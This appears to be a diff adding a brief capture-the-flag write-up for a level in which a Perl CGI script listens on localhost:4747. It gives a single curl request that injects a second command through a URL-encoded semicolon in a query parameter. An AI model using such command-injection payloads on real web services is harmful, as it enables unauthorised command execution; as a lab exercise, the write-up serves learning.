@@ -1,0 +1,4 @@
+The file 'level04.pl' is a perl CGI script executed by a server running on localhost:4747
+
+Sending a request with curl to inject the getflag command:
+`curl localhost:4747?x=%3Bgetflag`
